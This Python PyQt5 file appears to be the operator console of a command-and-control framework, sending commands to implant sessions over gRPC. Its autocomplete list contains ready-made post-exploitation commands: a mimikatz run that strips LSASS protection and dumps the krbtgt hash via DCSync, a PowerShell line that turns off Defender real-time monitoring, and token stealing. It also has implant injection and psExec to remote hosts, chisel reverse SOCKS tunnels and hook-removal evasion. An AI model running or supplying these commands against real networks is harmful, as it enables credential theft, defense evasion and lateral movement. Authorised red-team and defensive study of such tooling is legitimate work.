import sys
import os
import time
from threading import Thread, Lock
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *

from grpcClient import *


#
# Consoles
#
class ConsolesTab(QWidget):
    
    def __init__(self, parent, ip, port):
        super(QWidget, self).__init__(parent)
        widget = QWidget(self)
        self.layout = QHBoxLayout(widget)

        self.ip = ip
        self.port = port
        
        # Initialize tab screen
        self.tabs = QTabWidget()
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.closeTab) 
                
        # Add tabs to widget
        self.layout.addWidget(self.tabs)
        self.setLayout(self.layout)
        
    @pyqtSlot()
    def on_click(self):
        print("\n")
        for currentQTableWidgetItem in self.tableWidget.selectedItems():
            print(currentQTableWidgetItem.row(), currentQTableWidgetItem.column(), currentQTableWidgetItem.text())

    def addConsole(self, key):
        tabAlreadyOpen=False
        for idx in range(0,self.tabs.count()):
            openTabKey = self.tabs.tabText(idx)
            if openTabKey==key[0:8]:
                self.tabs.setCurrentIndex(idx)
                tabAlreadyOpen=True

        if tabAlreadyOpen==False:
            tab = QWidget()
            self.tabs.addTab(tab, key[0:8])
            tab.layout = QVBoxLayout(self.tabs)
            console = Console(self, self.ip, self.port, key)
            tab.layout.addWidget(console)
            tab.setLayout(tab.layout)
            self.tabs.setCurrentIndex(self.tabs.count()-1)

    def closeTab(self, currentIndex):
        currentQWidget = self.tabs.widget(currentIndex)
        currentQWidget.deleteLater()
        self.tabs.removeTab(currentIndex)


class Console(QWidget):
    tabPressed = pyqtSignal()
    key=""

    def __init__(self, parent, ip, port, key):
        super(QWidget, self).__init__(parent)
        self.layout = QVBoxLayout(self)

        self.grpcClient = GrpcClient(ip, port)

        self.key=key

        self.editorOutput = QPlainTextEdit()
        self.editorOutput.setFont(QFont("Courier"));
        self.editorOutput.setReadOnly(True)
        self.layout.addWidget(self.editorOutput, 8)

        self.commandEditor = CommandEditor()
        self.layout.addWidget(self.commandEditor, 2)
        self.commandEditor.returnPressed.connect(self.runCommand)

        # Thread to get sessions response
        # https://realpython.com/python-pyqt-qthread/
        self.thread = QThread()
        self.getSessionResponse = GetSessionResponse()
        self.getSessionResponse.moveToThread(self.thread)
        self.thread.started.connect(self.getSessionResponse.run)
        self.getSessionResponse.checkin.connect(self.displayResponse)
        self.thread.start()

    def __del__(self):
        self.getSessionResponse.quit()
        self.thread.quit()
        self.thread.wait()

    def nextCompletion(self):
        index = self._compl.currentIndex()
        self._compl.popup().setCurrentIndex(index)
        start = self._compl.currentRow()
        if not self._compl.setCurrentRow(start + 1):
            self._compl.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def runCommand(self):
        commandLine = self.commandEditor.displayText()
        self.commandEditor.clearLine()
        self.setCursorEditorAtEnd()

        if commandLine == "":
            line = '\n';
            self.editorOutput.insertPlainText(line)
        else:
            cmdHistoryFile = open('.cmdHistory', 'a')
            cmdHistoryFile.write(commandLine)
            cmdHistoryFile.write('\n')
            cmdHistoryFile.close()
            self.commandEditor.setCmdHistory()
            instructions = commandLine.split()
            if instructions[0]=="help":
                command = TeamServerApi_pb2.Command(
                cmd=commandLine)
                response = self.grpcClient.getHelp(command)
                line = '<p style=\"color:orange;white-space:pre\">[+] ' + response.cmd + '</p>'
                self.editorOutput.appendHtml(line)
                line = '\n' + response.response.decode(encoding="ascii", errors="ignore")  + '\n';
                self.editorOutput.insertPlainText(line)
            else:
                line = '<p style=\"color:orange;white-space:pre\">[+] send: \"' + commandLine + '\"</p>'
                self.editorOutput.appendHtml(line)
                line = '\n';
                self.editorOutput.insertPlainText(line)
                command = TeamServerApi_pb2.Command(
                    sessionId=self.key,
                    cmd=commandLine)
                result = self.grpcClient.sendCmdToSession(command)
                if result.message:
                    line = result.message + '\n';
                    self.editorOutput.insertPlainText(line)
        self.setCursorEditorAtEnd()

    def displayResponse(self):
        session = TeamServerApi_pb2.Session(beaconHash=self.key)
        responses = self.grpcClient.getResponseFromSession(session)
        for response in responses:
            self.setCursorEditorAtEnd()
            line = '<p style=\"color:red;white-space:pre\">[+] result: \"' + response.instruction + " "+ response.cmd + '\"</p>'
            self.editorOutput.appendHtml(line)
            line = '\n' + response.response.decode(encoding="ascii", errors="ignore")  + '\n'
            self.editorOutput.insertPlainText(line)
            self.setCursorEditorAtEnd()

    def setCursorEditorAtEnd(self):
        cursor = self.editorOutput.textCursor()
        cursor.movePosition(QTextCursor.End,)
        self.editorOutput.setTextCursor(cursor)
    

class GetSessionResponse(QObject):
    checkin = pyqtSignal()

    exit=False

    def run(self):
        while self.exit==False:
            self.checkin.emit()
            time.sleep(1)

    def quit(self):
        self.exit=True


class CommandEditor(QLineEdit):
    tabPressed = pyqtSignal()
    cmdHistory = []
    idx = 0

    def __init__(self, parent=None):
        super().__init__(parent)

        if(os.path.isfile('.cmdHistory')):
            cmdHistoryFile = open('.cmdHistory')
            self.cmdHistory = cmdHistoryFile.readlines()
            self.idx=len(self.cmdHistory)-1
            cmdHistoryFile.close()

        QShortcut(Qt.Key_Up, self, self.historyUp)
        QShortcut(Qt.Key_Down, self, self.historyDown)

        self.codeCompleter = CodeCompleter(completerData, self)
        # needed to clear the completer after activation
        self.codeCompleter.activated.connect(self.onActivated)
        self.setCompleter(self.codeCompleter)
        self.tabPressed.connect(self.nextCompletion)

    def nextCompletion(self):
        index = self.codeCompleter.currentIndex()
        self.codeCompleter.popup().setCurrentIndex(index)
        start = self.codeCompleter.currentRow()
        if not self.codeCompleter.setCurrentRow(start + 1):
            self.codeCompleter.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def historyUp(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.idx=max(self.idx-1,0)
            self.setText(cmd.strip())

    def historyDown(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            self.idx=min(self.idx+1,len(self.cmdHistory)-1)
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.setText(cmd.strip())

    def setCmdHistory(self):
        cmdHistoryFile = open('.cmdHistory')
        self.cmdHistory = cmdHistoryFile.readlines()
        self.idx=len(self.cmdHistory)-1
        cmdHistoryFile.close()

    def clearLine(self):
        self.clear()

    def onActivated(self):
        QTimer.singleShot(0, self.clear)


completerData = [
    ('help',[]),
    ('sleep',[]),
    ('end',[]),
    ('listener',[
             ('start', [
                         ('smb pipename',[]),
                         ('tcp 127.0.0.1 4444',[])
                        ]),
             ('stop',  [])
             ]),
    ('assemblyExec',[
                    ('-e mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',  []),
                    ('-e mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',  []),
                    ('-e SharpView.exe Get-DomainComputer',  []),
                    ('-e Rubeus.exe triage',  []),
                    ('-e Seatbelt.exe -group=system',  []),
                    ]),
    ('upload',[]),
    ('run',[
             ('cmd /c',  []),
             ('cmd /c sc query',  []),
             ('cmd /c wmic service where caption="Serviio" get name, caption, state, startmode',  []),
             ('cmd /c where /r c:\\ *.txt',  []),
             ('cmd /c tasklist /SVC',  []),
             ('cmd /c taskkill /pid 845 /f',  []),
             ('cmd /c schtasks /query /fo LIST /v',  [])
             ]),
    ('download',[]),
    ('inject',[
                ('-e BeaconHttp.exe -1 10.10.15.34 8443 https',  []),
                ('-e implant.exe -1',  []),
    ]),
    ('script',[]),
    ('pwd',[]),
    ('cd',[]),
    ('ls',[]),
    ('ps',[]),
    ('makeToken',[]),
    ('rev2self',[]),
    ('stealToken',[]),
    ('coffLoader',[
        ('adcs_enum.x64.o', [('go',[])]),
        ('adcs_enum_com.x64.o', [('go ZZ hostname sharename',[])]),
        ('adcs_enum_com2.x64.o', [('go',[])]),
        ('adv_audit_policies.x64.o', [('go',[])]),
        ('arp.x64.o', [('go',[])]),
        ('cacls.x64.o', [('go zz hostname servicename',[])]),
        ('dir.x64.o', [('go Zs targetdir subdirs',[])]),
        ('driversigs.x64.o', [('go Zi name, 0',[])]),
        ('enum_filter_driver.x64.o', [('go',[])]),
        ('enumlocalsessions.x64.o', [('go zz modname procname',[])]),
        ('env.x64.o', [('go',[])]),
        ('findLoadedModule.x64.o', [('go',[])]),
        ('get-netsession.x64.o', [('go',[])]),
        ('get_password_policy.x64.o', [('go Z server',[])]),
        ('ipconfig.x64.o', [('go',[])]),
        ('ldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
        ('listdns.x64.o', [('go',[])]),
        ('listmods.x64.o', [('go i pid',[])]),
        ('locale.x64.o', [('go',[])]),
        ('netgroup.x64.o', [('go sZZ type server group',[])]),
        ('netlocalgroup.x64.o', [('go',[])]),
        ('netshares.x64.o', [('go Zi name, 1',[])]),
        ('netstat.x64.o', [('go',[])]),
        ('netuse.x64.o', [('go sZZZZss 1 share user password device persist requireencrypt',[])]),
        ('netuser.x64.o', [('go ZZ 2 domain',[])]),
        ('netuserenum.x64.o', [('go',[])]),
        ('netview.x64.o', [('go Z domain',[])]),
        ('nonpagedldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
        ('nslookup.x64.o', [('go zzs lookup server type',[])]),
        ('probe.x64.o', [('go zi host port',[])]),
        ('reg_query.x64.o', [('go zizzi hostname hive path key, 0',[])]),
        ('resources.x64.o', [('go',[])]),
        ('routeprint.x64.o', [('go',[])]),
        ('sc_enum.x64.o', [('go',[])]),
        ('schtasksenum.x64.o', [('go ZZ 2 3',[])]),
        ('schtasksquery.x64.o', [('go',[])]),
        ('sc_qc.x64.o', [('go zz hostname servicename',[])]),
        ('sc_qdescription.x64.o', [('go zz hostname servicename',[])]),
        ('sc_qfailure.x64.o', [('go',[])]),
        ('sc_qtriggerinfo.x64.o', [('go',[])]),
        ('sc_query.x64.o', [('go',[])]),
        ('tasklist.x64.o', [('go Z system',[])]),
        ('uptime.x64.o', [('go',[])]),
        ('vssenum.x64.o', [('go',[])]),
        ('whoami.x64.o', [('go',[])]),
        ('windowlist.x64.o', [('go',[])]),
        ('wmi_query.x64.o', [('go ZZZ system namespace query',[])]),
             ]),
    ('unloadModule',[
             ('assemblyExec', []),
             ('beaconHttpDll', []),
             ('changeDirectory', []),
             ('coff', []),
             ('download', []),
             ('inject', []),
             ('listDirectory', []),
             ('listProcesses', []),
             ('makeToken', []),
             ('printWorkingDirectory', []),
             ('rev2self', []),
             ('run', []),
             ('script', []),
             ('stealToken', []),
             ('upload',  []),
             ('powershell',  []),
             ('psExec',  []),
             ('kerberosUseTicket',  []),
             ('chisel',  []),
             ('evasion',  []),
             ('spawnAs',  [])
             ]),
    ('kerberosUseTicket',[]),
    ('powershell',[
                ('-i PowerView.ps1',  []),
                ('Set-MpPreference -DisableRealtimeMonitoring $true',  []),
                ]),
    ('chisel',[
                ('status',  []),
                ('stop',  []),
                ('chisel.exe client 192.168.57.21:8080 R:socks',  []),
                ('chisel.exe client 192.168.57.21:8080 R:445:192.168.57.14:445',  []),
                ]),
    ('psExec',[
        ('implant.exe 10.10.10.10',  []),
    ]),
    ('spawnAs',[
        ('user password implant.exe',  []),
    ]),
    ('evasion',[
        ('CheckHooks',  []),
        ('Unhook',  []),
    ]),
    ('loadModule',[
             ('AssemblyExec.dll', []),
             ('BeaconHttpDll.dll', []),
             ('ChangeDirectory.dll', []),
             ('Coff.dll', []),
             ('Download.dll', []),
             ('Inject.dll', []),
             ('ListDirectory.dll', []),
             ('ListProcesses.dll', []),
             ('MakeToken.dll', []),
             ('PrintWorkingDirectory.dll', []),
             ('Rev2self.dll', []),
             ('Run.dll', []),
             ('Script.dll', []),
             ('StealToken.dll', []),
             ('Upload.dll',  []),
             ('Powershell.dll',  []),
             ('PsExec.dll',  []),
             ('KerberosUseTicket.dll',  []),
             ('Chisel.dll',  []),
             ('SpawnAs.dll',  []),
             ('Evasion.dll',  [])
             ]),
]

class CodeCompleter(QCompleter):
    ConcatenationRole = Qt.UserRole + 1

    def __init__(self, data, parent=None):
        super().__init__(parent)
        self.createModel(data)

    def splitPath(self, path):
        return path.split(' ')

    def pathFromIndex(self, ix):
        return ix.data(CodeCompleter.ConcatenationRole)

    def createModel(self, data):
        def addItems(parent, elements, t=""):
            for text, children in elements:
                item = QStandardItem(text)
                data = t + " " + text if t else text
                item.setData(data, CodeCompleter.ConcatenationRole)
                parent.appendRow(item)
                if children:
                    addItems(item, children, data)
        model = QStandardItemModel(self)
        addItems(model, data)
        self.setModel(model)